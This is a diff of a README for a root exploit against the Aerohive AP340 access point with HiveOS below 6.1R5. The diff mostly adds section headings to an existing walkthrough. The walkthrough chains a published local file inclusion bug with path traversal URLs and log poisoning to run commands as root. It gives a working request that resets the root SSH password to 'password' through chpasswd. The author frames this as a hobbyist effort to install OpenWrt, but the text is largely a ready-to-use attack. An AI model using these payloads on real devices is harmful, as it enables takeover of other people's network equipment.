@@ -2,9 +2,10 @@
 Python script to change the root password on the AeroHive AP340 with HiveOS < 6.1R5
 The result is direct root command line access via /bin/sh rather than the locked down AH CLI.
 
+## Setup
 No dependencies required. Just need the IP address of the AP340 and the code will set the root password to "password"
 
-Discovery:
+## Recon
 
 I first set about to try and root this device with the hopes of building/installing something like
 OpenWrt on it. I have yet to accomplish that as of yet, but I did manage to gain root access via SSH
@@ -21,6 +22,7 @@ https://www.exploit-db.com/exploits/34038/
 "Aerohive version 5.1r5 through 6.1r5 contain two vulnerabilities, one reflective XSS vulnerability and a **limited local file inclusion vulnerability (I was only able to view source from one specific folder, *maybe you can leverage this further)***. 
 It's possible earlier version are affected, I was only able to review 5.1r5 briefly, the vendor indicated other version up to 6.1r5 are vulnerable as well."
 
+## Exploitation
 Of particular interest was the LFI vulnerability and the tantalizing "maybe you can leverage this further."
 With every intent to leverage this further, I tested the example LFI from the exploit-db page:
 
@@ -40,6 +42,7 @@ http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../
 Great! The web server is running as a privileged user. I tried cracking the hashes for around 30 minutes with John to no avail.
 Your mileage may vary. In any case, this was a dead end that I put off till later if I couldn't find another way in.
 
+## Post Exploitation
 We can also see the system boot/error logs with:
 http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00
 
@@ -68,10 +71,14 @@ http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../
 
 Viewing source for the page and searching for "whoami" and we see that it worked! The web server process is running as the root user.
 
+## Privilege Escalation
+
 Now, how to get a reverse shell? There are lots of methods out there for running netcat, telnet, fifo shells, etc.
 I chose to go the simple route and just reset the root SSH password with:
 
 http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=echo+root:password+|+/usr/sbin/chpasswd
+
+https://imgur.com/a/YT8Pw
 
 > echo root:password | /usr/sbin/chpasswd
 
